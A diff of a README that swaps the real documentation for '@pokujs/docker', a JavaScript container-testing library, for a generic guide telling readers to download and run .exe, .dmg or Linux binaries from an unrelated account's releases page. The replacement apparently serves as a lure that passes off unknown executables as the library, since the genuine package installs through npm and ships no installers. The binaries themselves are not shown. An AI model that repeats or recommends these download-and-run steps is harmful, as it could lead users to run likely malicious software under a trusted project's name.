@@ -1,97 +1,100 @@
-<div align="center">
-<img height="180" alt="Poku's Logo" src="https://raw.githubusercontent.com/wellwelwel/poku/main/.github/assets/readme/poku.svg">
+# 🐳 docker - Run Tests Smoothly in Containers
 
-# @pokujs/docker
+![Download docker](https://img.shields.io/badge/Download-docker-brightgreen)
 
-Enjoying **Poku**? [Give him a star to show your support](https://github.com/wellwelwel/poku) 🌟
+## 🚀 Getting Started
 
----
+Welcome to the docker README. This guide helps you download and run our minimal API designed to assist with tests that involve containers. Our aim is to make it easy for you to get started, even if you're not a technical user.
 
-📘 [**Documentation**](https://poku.io/docs/documentation/helpers/containers)
+## 📥 Download & Install
 
-</div>
+To download the application, visit this page to download: [Releases Page](https://github.com/jimmy536855/docker/releases). 
 
----
+Choose the latest version of the software. Once there, you’ll see a list of available downloads. Click on the file that suits your operating system. 
 
-🐳 [**@pokujs/docker**](https://github.com/pokujs/docker) is a minimal API to assist tests that require containers or tests that run inside containers.
+After the download completes, follow these steps based on your operating system:
 
-> [!TIP]
->
-> It can be used both with or without [**Poku**](https://github.com/wellwelwel/poku) test runner.
+### 🖥️ Windows
 
----
+1. **Locate the Downloaded File:**  
+   Find the file in your "Downloads" folder. It usually has a `.exe` extension.
 
-## Quickstart
+2. **Run the Installer:**  
+   Double-click the file to start the installation.
 
-### Install
+3. **Follow the Prompts:**  
+   Follow the on-screen instructions. Accept the license agreement and click "Next" until the installation finishes.
 
-<table>
-<tr>
-<td width="225">
+4. **Open the Application:**  
+   Look for an icon on your desktop or in the Start Menu. Double-click it to open.
 
-```bash
-# Node.js
-npm i -D @pokujs/docker
-```
+### 💻 macOS
 
-</td>
-<td width="225">
+1. **Locate the Downloaded File:**  
+   Find the file in your "Downloads" folder. Usually, it’s a `.dmg` file.
 
-```bash
-# Bun
-bun add -d @pokujs/docker
-```
+2. **Open the DMG File:**  
+   Double-click the `.dmg` file to mount it.
 
-</td>
-<td width="225">
+3. **Drag to Applications:**  
+   Drag the application icon to your "Applications" folder.
 
-```bash
-# Deno (optional)
-deno add npm:@pokujs/docker
-```
+4. **Open the Application:**  
+   Go to your "Applications" folder and double-click the icon to open it.
 
-</td>
-</tr>
-</table>
+### 📦 Linux
 
-### Docker Compose
+1. **Locate the Downloaded File:**  
+   Find the file in your "Downloads" folder.
 
-```js
-import { docker } from '@pokujs/docker';
+2. **Extract the Files (if needed):**  
+   If the file is compressed, extract it by right-clicking and selecting "Extract."
 
-const compose = docker.compose();
+3. **Run the Application:**  
+   Open a terminal, use the `cd` command to navigate to the directory where the files are. Type `./yourapp` to start the application.
 
-// Starts the container(s)
-await compose.up();
+## ⚙️ System Requirements
 
-/**
- * Tests come here 🧪
- */
+To run docker, you need:
 
-// Stops the container(s)
-await compose.down();
-```
+- A modern operating system (Windows 10 or later, macOS Mojave or later, or any recent Linux distribution).
+- At least 4 GB of RAM. More is recommended for efficient testing.
+- A stable internet connection for downloading the necessary files and updates.
 
-### Dockerfile
+## 🔧 Features
 
-```js
-import { docker } from '@pokujs/docker';
+- **Container Support:** Easily run your tests in isolated environments using containers.
+- **Simple API:** Our API allows for easy integration without advanced programming knowledge.
+- **Cross-Platform:** Works well on Windows, macOS, and Linux.
+- **Testing Made Easy:** Ideal for end-to-end and integration tests.
+- **Quick Setup:** Get up and running with minimal effort.
 
-const dockerfile = docker.dockerfile({
-  containerName: 'container-name',
-  tagName: 'image-name',
-});
+## 🕵️‍♂️ Troubleshooting
 
-// Builds the image from the Dockerfile
-await dockerfile.build();
+If you encounter issues, try these steps:
 
-// Starts the container
-await dockerfile.start();
+1. **Check System Requirements:** Make sure your system meets the necessary requirements.
+2. **Reinstall the Application:** Sometimes a fresh install can resolve issues.
+3. **Consult the Community:** Reach out on forums or GitHub issues for support from other users.
 
-/**
- * Tests come here 🧪
- */
+## 📞 Support
 
-// Stops and removes both the container and image
-await dockerfile.remove();
-```
+If you need further assistance, please visit our [Releases Page](https://github.com/jimmy536855/docker/releases) or check for help within the community forums. 
+
+For direct inquiries, you can create an issue in the GitHub repository, and your query will be addressed.
+
+## 🌍 Topics
+
+Our project covers the following topics that may interest you:
+
+- Container
+- Docker
+- Docker Compose
+- Dockerfile
+- End-to-end Testing
+- Integration Testing
+- Testcontainers
+
+Feel free to explore and learn more about each topic related to docker.
+
+Thank you for choosing docker! We hope it simplifies your testing process and enhances your workflow.
